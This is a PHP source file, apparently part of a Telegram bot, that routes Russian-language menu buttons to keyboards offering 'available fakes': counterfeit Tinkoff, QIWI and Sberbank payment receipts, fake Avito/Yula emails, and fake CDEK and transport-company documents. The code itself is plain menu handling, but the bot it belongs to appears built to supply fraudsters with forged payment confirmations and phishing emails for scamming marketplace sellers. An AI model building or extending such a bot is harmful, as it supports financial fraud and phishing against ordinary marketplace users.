<?php

//Список меню

use unreal4u\TelegramAPI\Telegram\Types\ReplyKeyboardMarkup;

switch ($update->message->text){

    case "💰 Чеки":
        $sendMessage->text = "Доступные чеки:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['checks'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "🔆 Тинькофф":
        $sendMessage->text = "Доступные фейки Тинькофф:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['tinkoff'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "⚜️ QIWI":
        $sendMessage->text = "Доступные фейки QIWI:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['qiwi'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "♻️ Сбербанк":
        $sendMessage->text = "Доступные фейки Сбербанк:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['sberbank'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "💌 Фейковые письма Авито/Юла":
        $sendMessage->text = "Все доступные фейки писем:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['fakemails'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "🚛ТК":
        $sendMessage->text = "Доступные фейки ТК:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['company'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "🚛СДЭК":
        $sendMessage->text = "Доступные фейки СДЭК:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $keyboards['cdek'];
        $sendMessage->reply_markup->one_time_keyboard = true;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

    case "⬅️ Назад":
        $sendMessage->text = "⬅️ Назад:";
        $sendMessage->reply_markup = new ReplyKeyboardMarkup();
        $sendMessage->reply_markup->keyboard = $mainkeyboard;
        $sendMessage->reply_markup->one_time_keyboard = false;
        $sendMessage->reply_markup->resize_keyboard = true;
        $tgLog->performApiRequest($sendMessage);
        break;

}

